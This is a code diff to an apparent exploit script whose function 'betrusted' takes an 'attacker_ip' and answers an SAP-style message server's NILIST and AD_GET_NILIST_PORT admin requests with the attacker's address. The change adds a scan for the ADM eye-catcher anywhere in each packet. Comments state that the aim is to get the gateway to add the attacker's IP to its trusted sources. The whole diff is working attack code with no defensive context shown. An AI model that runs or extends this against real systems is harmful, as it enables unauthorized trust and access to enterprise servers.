@@ -560,44 +560,66 @@ def _wait_and_reply_nilist(sock: socket.socket, fromname: str, key: bytes,
             f"body={pkt[_HEADER_LEN:_HEADER_LEN+24].hex()}{ip_in_pkt}"
         )
 
+        # --- Scan full packet for ADM eye-catcher regardless of flag ---
+        # SM66 evidence: the MS sends AD_GET_NILIST_PORT inside FLAG_REQUEST
+        # (0x02) packets, not FLAG_ADMIN (0x04) packets as we expected.
+        # The ADM eye-catcher "AD-EYECATCH\x00" is somewhere in the body but
+        # NOT at byte 0 of the body — so the flag-based dispatch misses it.
+        # Scan the whole packet for the eye-catcher as the primary handler.
+        adm_eye_pos = pkt.find(_ADM_EYE, _HEADER_LEN)
+        if adm_eye_pos >= 0:
+            adm = pkt[adm_eye_pos:]
+            print(f"[*] Wait: ADM eye-catcher found at offset {adm_eye_pos} "
+                  f"(flag={flag:#04x}) adm_prefix={adm[:16].hex()}")
+            if len(adm) >= _ADM_HDR_LEN + 1:
+                first_opcode = adm[_ADM_HDR_LEN]
+                print(f"[*] Wait: ADM opcode={first_opcode:#04x}")
+                if first_opcode == ADM_NILIST:
+                    print(f"[*] ADM NILIST request received — replying with {attacker_ip}")
+                    reply = build_nilist_reply(fromname, key, attacker_ip, kernel_new)
+                    ni_send(sock, reply)
+                    return True
+                if first_opcode == ADM_GET_NILIST_PORT:
+                    actual_p = _start_nilist_listener(attacker_ip, _NILIST_PORT)
+                    if actual_p:
+                        time.sleep(0.05)
+                        print(f"[*] AD_GET_NILIST_PORT received — "
+                              f"replying port={actual_p} (NILIST listener ready)")
+                        reply = build_nilist_port_reply(fromname, key,
+                                                        nilist_port=actual_p)
+                    else:
+                        print(f"[!] AD_GET_NILIST_PORT — NILIST listener failed, "
+                              f"replying port=0 (fallback)")
+                        reply = build_nilist_port_reply(fromname, key, nilist_port=0)
+                    ni_send(sock, reply)
+                    # Don't return — keep waiting for NILIST follow-up
+            continue   # handled via eye-catcher scan; skip flag-based dispatch
+
+        # --- Flag-based dispatch (fallback for packets without eye-catcher) ---
         if flag == FLAG_ADMIN:
             adm = pkt[_HEADER_LEN:]
-
-            # Standard ADM body: starts with AD-EYECATCH\x00 (12 bytes)
-            if adm[:12] == _ADM_EYE and len(adm) >= _ADM_HDR_LEN + 1:
-                first_opcode = adm[_ADM_HDR_LEN]   # record's opcode byte
-            elif len(adm) >= 1:
-                # Some kernels omit the ADM eyecatcher — opcode at byte 0
+            # Eye-catcher not found above (scan covers whole pkt), so try
+            # no-eyecatcher variant: opcode at byte 0 of body
+            if len(adm) >= 1:
                 first_opcode = adm[0]
-                logger.debug(f"ADM without eyecatcher, treating byte[0]={first_opcode:#04x} as opcode")
+                print(f"[*] Wait: FLAG_ADMIN no eye-catcher, byte[0]={first_opcode:#04x}")
             else:
                 continue
 
             if first_opcode == ADM_NILIST:
-                # Push-model NILIST: MS wants our IP list inline
-                print(f"[*] ADM NILIST request received — replying with {attacker_ip}")
+                print(f"[*] ADM NILIST (no eye) — replying with {attacker_ip}")
                 reply = build_nilist_reply(fromname, key, attacker_ip, kernel_new)
                 ni_send(sock, reply)
                 return True
-
             if first_opcode == ADM_GET_NILIST_PORT:
-                # Pull-model: MS asks "what port is your NILIST listener?"
-                # Start a real TCP listener and give the GW the port number so
-                # it can connect and fetch our IP list.  port=0 ("no listener")
-                # prevents the GW from learning our IP and trusting it.
                 actual_p = _start_nilist_listener(attacker_ip, _NILIST_PORT)
                 if actual_p:
                     time.sleep(0.05)
-                    print(f"[*] AD_GET_NILIST_PORT received — "
-                          f"replying port={actual_p} (NILIST listener ready)")
-                    reply = build_nilist_port_reply(fromname, key,
-                                                    nilist_port=actual_p)
+                    reply = build_nilist_port_reply(fromname, key, nilist_port=actual_p)
+                    print(f"[*] AD_GET_NILIST_PORT (no eye) — replying port={actual_p}")
                 else:
-                    print(f"[!] AD_GET_NILIST_PORT — NILIST listener failed, "
-                          f"replying port=0 (fallback)")
                     reply = build_nilist_port_reply(fromname, key, nilist_port=0)
                 ni_send(sock, reply)
-                # Don't return — keep waiting; MS may follow with NILIST request
 
         elif flag in (FLAG_REQUEST, FLAG_ONE_WAY) and iflag == 0:
             if opc.get("opcode") == OPCODE_NILIST:
@@ -605,15 +627,12 @@ def _wait_and_reply_nilist(sock: socket.socket, fromname: str, key: bytes,
                 reply = build_nilist_reply(fromname, key, attacker_ip, kernel_new)
                 ni_send(sock, reply)
                 return True
-            # Also handle AD_GET_NILIST_PORT sent as a REQUEST (some kernel variants)
             if opc.get("opcode") == ADM_GET_NILIST_PORT:
                 actual_p = _start_nilist_listener(attacker_ip, _NILIST_PORT)
                 if actual_p:
                     time.sleep(0.05)
-                    print(f"[*] AD_GET_NILIST_PORT (REQUEST) — "
-                          f"replying port={actual_p}")
-                    reply = build_nilist_port_reply(fromname, key,
-                                                    nilist_port=actual_p)
+                    reply = build_nilist_port_reply(fromname, key, nilist_port=actual_p)
+                    print(f"[*] AD_GET_NILIST_PORT (REQUEST opc) — replying port={actual_p}")
                 else:
                     reply = build_nilist_port_reply(fromname, key, nilist_port=0)
                 ni_send(sock, reply)
@@ -899,42 +918,55 @@ def betrusted(host: str, port: int, attacker_ip: str,
                           f"len={len(pkt)} body={pkt[_HEADER_LEN:_HEADER_LEN+24].hex()}"
                           f"{ip_tag}")
                     try:
-                        if flag2 == FLAG_ADMIN:
+                        # Scan full packet for ADM eye-catcher (MS sends ADM
+                        # inside FLAG_REQUEST packets on newer kernels)
+                        adm_pos2 = pkt.find(_ADM_EYE, _HEADER_LEN)
+                        if adm_pos2 >= 0:
+                            adm2 = pkt[adm_pos2:]
+                            if len(adm2) >= _ADM_HDR_LEN + 1:
+                                opcode = adm2[_ADM_HDR_LEN]
+                                print(f"[*] Hold: ADM eye at offset {adm_pos2} "
+                                      f"opcode={opcode:#04x}")
+                                if opcode == ADM_NILIST:
+                                    print("[*] Hold: ADM NILIST — replying")
+                                    ni_send(sock, build_nilist_reply(
+                                        our_name, key, attacker_ip, kernel_new))
+                                    result["nilist_response"] = True
+                                    result["nilist_sent"] = True
+                                elif opcode == ADM_GET_NILIST_PORT:
+                                    actual_p = _start_nilist_listener(
+                                        attacker_ip, _NILIST_PORT)
+                                    if actual_p:
+                                        time.sleep(0.05)
+                                        print(f"[*] Hold: AD_GET_NILIST_PORT — "
+                                              f"replying port={actual_p}")
+                                        ni_send(sock, build_nilist_port_reply(
+                                            our_name, key, nilist_port=actual_p))
+                                    else:
+                                        print("[!] Hold: NILIST listener failed — port=0")
+                                        ni_send(sock, build_nilist_port_reply(
+                                            our_name, key, nilist_port=0))
+                                else:
+                                    print(f"[*] Hold: ADM opcode {opcode:#04x} (ignored)")
+                        elif flag2 == FLAG_ADMIN:
                             adm = pkt[_HEADER_LEN:]
-                            # Determine opcode: with or without ADM eyecatcher
-                            if adm[:12] == _ADM_EYE and len(adm) >= _ADM_HDR_LEN + 1:
-                                opcode = adm[_ADM_HDR_LEN]
-                            elif len(adm) >= 1:
-                                opcode = adm[0]
-                            else:
-                                continue
+                            opcode = adm[0] if len(adm) >= 1 else -1
+                            print(f"[*] Hold: FLAG_ADMIN no eye, byte[0]={opcode:#04x}")
                             if opcode == ADM_NILIST:
-                                print("[*] Hold: ADM NILIST request — replying")
                                 ni_send(sock, build_nilist_reply(
                                     our_name, key, attacker_ip, kernel_new))
                                 result["nilist_response"] = True
                                 result["nilist_sent"] = True
                             elif opcode == ADM_GET_NILIST_PORT:
-                                # Start a real NILIST TCP listener so GW can
-                                # fetch our IP list.  Replying port=0 ("no
-                                # listener") prevents GW from adding our IP to
-                                # its trusted sources even if our DP blob was
-                                # accepted by the MS.
                                 actual_p = _start_nilist_listener(
                                     attacker_ip, _NILIST_PORT)
                                 if actual_p:
-                                    time.sleep(0.05)  # give listener time to bind
-                                    print(f"[*] Hold: AD_GET_NILIST_PORT — "
-                                          f"replying port={actual_p}")
+                                    time.sleep(0.05)
                                     ni_send(sock, build_nilist_port_reply(
                                         our_name, key, nilist_port=actual_p))
                                 else:
-                                    print("[!] Hold: NILIST listener failed — "
-                                          "replying port=0 (fallback)")
                                     ni_send(sock, build_nilist_port_reply(
                                         our_name, key, nilist_port=0))
-                            else:
-                                print(f"[*] Hold: ADM opcode {opcode:#04x} (ignored)")
                         elif flag2 in (FLAG_REQUEST, FLAG_ONE_WAY):
                             opc2 = ms_parse_opcode(pkt)
                             opc_val = opc2.get("opcode", -1)
